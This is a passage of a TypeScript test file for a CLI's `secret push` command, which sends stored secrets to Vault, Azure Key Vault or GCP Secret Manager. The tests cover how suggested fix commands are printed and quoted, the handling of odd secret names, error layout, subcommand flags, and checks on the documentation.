      if (u.pathname === '/v1/sys/health') return json(200, { initialized: true, sealed: false });
      if (call.method === 'GET' && u.pathname.startsWith('/v1/secret/metadata/')) return json(404, { errors: [] });
      return json(400, {});
    };
    const code = await runSecretPush(['API_KEY,DB_PASSWORD', '--to', 'vault', '--as', 'a.b,-x', '--dry-run'], { store, createTarget: TARGETS.vault });
    expect(code).toBe(2);
    const fix = fixCommand();
    expect(fix).toEqual(['API_KEY,DB_PASSWORD', '--to', 'vault', '--dry-run', '--as', 'a_b,-x']);

    out.length = 0;
    expect(await runSecretPush(fix, { store, createTarget: TARGETS.vault })).toBe(0);
    expect(printed()).toContain(`  Apply:   ${CLI} secret push API_KEY,DB_PASSWORD --to vault --as a_b,-x`);
    expect(calls.filter((c) => c.method !== 'GET')).toEqual([]);
    expectNoLeak();
  });

  it('a secret name that starts with \'-\' later in the name list is still read, and the Apply line gives it back where it stands (#322)', async () => {
    await store.setSecret('-x', VALUES.DB_PASSWORD);
    handler = (call) => {
      const u = new URL(call.url);
      if (u.pathname === '/v1/sys/health') return json(200, { initialized: true, sealed: false });
      if (call.method === 'GET' && u.pathname.startsWith('/v1/secret/metadata/')) return json(404, { errors: [] });
      return json(400, {});
    };
    const code = await runSecretPush(['API_KEY,-x', '--to', 'vault', '--dry-run'], { store, createTarget: TARGETS.vault });
    expect(code, printed()).toBe(0);
    expect(printed()).not.toContain('cannot be the first name');
    expect(printed()).toContain('  Names:  2');
    expect(printed()).toContain(`  Apply:   ${CLI} secret push API_KEY,-x --to vault\n`);
    expect(calls.filter((c) => c.method !== 'GET')).toEqual([]);
    expectNoLeak();
  });

  it('each <name> in a Fix is quoted, and run as printed the Fix is refused for naming a placeholder', async () => {
    const code = await runSecretPush(['A,B', '--to', 'vault', '--as', '<2fa>,a.b'], { store, createTarget: TARGETS.vault });
    expect(code).toBe(2);
    expect(printed().split('\n')).toContain(`  Fix:     ${CLI} secret push A,B --to vault --as '<name>',a_b`);
    const fix = fixCommand();
    expect(fix).toEqual(['A,B', '--to', 'vault', '--as', '<name>,a_b']);

    out.length = 0;
    expect(await runSecretPush(fix, { store, createTarget: TARGETS.vault })).toBe(2);
    expect(printed()).toContain('  "<name>" in --as is a placeholder: replace it with the name A should have in ');
    expect(calls).toEqual([]);
  });

  it('no Fix holds an angle bracket outside quotes, so a shell reads none of it as a redirection', async () => {
    const cases: string[][] = [
      ['A,B', '--to', 'vault', '--as', 'x,x'],
      ['A,B', '--to', 'vault', '--as', 'a_b,a.b'],
      ['A,B', '--to', 'vault', '--as', '<names>,a.b'],
      ['A,B', '--to', 'vault', '--as', '<name>,<name>'],
      ['A,B', '--to', 'vault', '--dry-run', '--as', 'a.b,<2fa>'],
      ['A,B', '--to', 'azure-kv', '--vault', 'kv-demo', '--as', 'ab,AB'],
      ['A,B', '--to', 'gcp-sm', '--as', 'x\ny,a.b'],
    ];
    for (const args of cases) {
      out.length = 0;
      const said = JSON.stringify(args);
      expect(await runSecretPush(args, { store, createTarget: (to) => TARGETS[to]() }), said).toBe(2);
      const fixLines = printed().split('\n').filter((l) => l.startsWith('  Fix:'));
      expect(fixLines, said).toHaveLength(1);
      expect(fixLines[0], said).toContain('<');
      expect(fixLines[0].replace(/'[^']*'/g, ''), said).not.toMatch(/[<>]/);
    }
  });

  it('the first refused name whose replacement is taken gets the line that gives the rule and the "is taken by" line', async () => {
    expect(await runSecretPush(['A,B', '--to', 'vault', '--as', 'a_b,a.b'], { store, createTarget: TARGETS.vault })).toBe(2);
    const lines = printed().split('\n');
    const rule = lines.findIndex((l) => l.startsWith('  "a.b" cannot name a secret in ') && l.endsWith("names allow letters, digits, '-' and '_'."));
    const taken = lines.indexOf('  "a_b" is taken by A; choose another name for B.');
    expect(rule, lines.join('\n')).toBeGreaterThan(-1);
    expect(taken, lines.join('\n')).toBeGreaterThan(rule);
    expect(fixCommand()).toEqual(['A,B', '--to', 'vault', '--as', 'a_b,<name>']);
  });
});

describe('secret push offers `secret set` only for a missing name `secret set` stores (#323)', () => {
  const cannotSet = (name: string): string =>
    `  "${name}" cannot be stored by \`secret set\`, which takes a name that starts with a letter; give the name the secret is stored under.`;

  function setFix(): string[] | undefined {
    const line = printed().split('\n').find((l) => l.startsWith('  Fix:'));
    const command = /secret set (.+)$/.exec(line ?? '');
    return command === null ? undefined : command[1].split(' ');
  }

  it('a later name that starts with \'-\' and is not stored gets no `secret set` Fix, and a line says why', async () => {
    const code = await runSecretPush(['API_KEY,-x', '--to', 'vault', '--dry-run'], { store, createTarget: TARGETS.vault });
    expect(code).toBe(1);
    const lines = printed().split('\n');
    expect(lines).toContain('  Not stored on this machine: -x');
    expect(lines).toContain(cannotSet('-x'));
    expect(lines).toContain(`  Verify:  ${CLI} secret list`);
    expect(lines.filter((l) => l.startsWith('  Fix:'))).toEqual([]);
    expect(calls).toEqual([]);
  });

  it('beside names `secret set` cannot take, the Fix names the first it can, and run as printed it stores that one', async () => {
    const code = await runSecretPush(['API_KEY,-x,_y,9z,NOT_STORED', '--to', 'vault'], { store, createTarget: TARGETS.vault });
    expect(code).toBe(1);
    const lines = printed().split('\n');
    expect(lines).toContain('  Not stored on this machine: -x, _y, 9z, NOT_STORED');
    for (const name of ['-x', '_y', '9z']) expect(lines).toContain(cannotSet(name));
    expect(lines).not.toContain(cannotSet('NOT_STORED'));
    const fix = setFix();
    expect(fix).toEqual(['NOT_STORED']);

    out.length = 0;
    const stdin = new PassThrough();
    stdin.end('FAKE-push-later-value-6d2a\n');
    const set = await runSecret(['set', ...(fix ?? [])], {
      createStore: () => store,
      afterSet: () => {},
      stdin: stdin as TtyInput,
      stdinIsPiped: () => true,
    });
    expect(set, printed()).toBe(0);
    expect(await store.listSecrets()).toContain('NOT_STORED');
  });

  it('a name `secret set` takes is offered as before, with no line about the names it cannot take', async () => {
    const code = await runSecretPush(['API_KEY,NOT_STORED', '--to', 'vault'], { store, createTarget: TARGETS.vault });
    expect(code).toBe(1);
    expect(printed()).not.toContain('cannot be stored by `secret set`');
    expect(setFix()).toEqual(['NOT_STORED']);
  });
});

// --- Error layout ------------------------------------------------------------

describe('secret push prints a setup error in the layout the other secret commands use (#247)', () => {
  it('a target that cannot be built: every line of the message indented, none at column 0', async () => {
    const code = await runSecretPush(['API_KEY', '--to', 'vault'], {
      store,
      createTarget: () => {
        throw new Error('VAULT_ADDR is not set\nSet it to the Vault server address, then run the push again.');
      },
    });
    expect(code).toBe(1);
    expect(printed()).toBe([
      '',
      '  Error: VAULT_ADDR is not set',
      '  Set it to the Vault server address, then run the push again.',
      '',
    ].join('\n'));
    expect(calls).toEqual([]);
  });
});

// --- Dispatch and flag ownership ---------------------------------------------

describe('secret push is a subcommand, and its flags belong to it', () => {
  it('is reached from `secret push`, which used to be an unknown subcommand', async () => {
    expect(await runSecret(['push'])).toBe(2);
    expect(printed()).toContain('Name the secrets to push.');
    expect(printed()).not.toContain('Unknown secret command');
  });

  it('refuses --to on another subcommand rather than ignoring it', async () => {
    expect(await runSecret(['set', '--to', 'azure-kv', 'API_KEY=x'])).toBe(2);
    expect(printed()).toContain('--to applies to `secret push` only');
  });

  it('refuses a sync flag on push', async () => {
    expect(await runSecretPush(['API_KEY', '--to', 'vault', '--force'], { store })).toBe(2);
    expect(printed()).toContain('--force is not read by `secret push`');
  });
});

// --- What the vault guide says about push targets ----------------------------

describe('the vault guide never says a push target is missing from the CLI (#343)', () => {
  const REPO_ROOT = path.resolve(__dirname, '..');
  const guide = fs.readFileSync(path.join(REPO_ROOT, 'docs', 'use-cases', 'bring-your-own-vault.md'), 'utf-8');
  // The push section moved from the README to docs/managing-secrets.md.
  const secretsDoc = fs.readFileSync(path.join(REPO_ROOT, 'docs', 'managing-secrets.md'), 'utf-8');
  const SERVICE: Record<PushTargetType, string> = {
    'azure-kv': 'Azure Key Vault',
    vault: 'HashiCorp Vault',
    'gcp-sm': 'GCP Secret Manager',
  };

  it('names no push target in a line that says the CLI does not have it', () => {
    const denials = guide.split('\n').filter((line) => /\b(?:isn't|aren't|not) part of this CLI\b/i.test(line));
    for (const target of PUSH_TARGETS) {
      for (const line of denials) expect(line).not.toContain(SERVICE[target]);
    }
  });

  it('calls Azure Key Vault a push target and links the docs section on `secret push --to azure-kv`', () => {
    expect(guide).toContain('push target, not as a storage backend');
    expect(guide).toContain('`secret push --to azure-kv`');

    const anchor = guide.match(/\]\(\.\.\/managing-secrets\.md#([a-z0-9-]+)\)/)?.[1];
    expect(anchor).toBeDefined();
    const lines = secretsDoc.split('\n');
    const start = lines.findIndex((line) => {
      const h = line.match(/^(#{1,6})\s+(.+?)\s*$/);
      return h !== null && h[2].toLowerCase().replace(/[^a-z0-9\s-]/g, '').replace(/\s/g, '-') === anchor;
    });
    expect(start).toBeGreaterThan(-1);
    const level = lines[start].match(/^#+/)![0].length;
    const end = lines.findIndex((line, i) => i > start && new RegExp(`^#{1,${level}}\\s`).test(line));
    const section = lines.slice(start, end === -1 ? undefined : end).join('\n');
    expect(section).toContain('`secret push`');
    expect(section).toContain('--to azure-kv');
  });
});
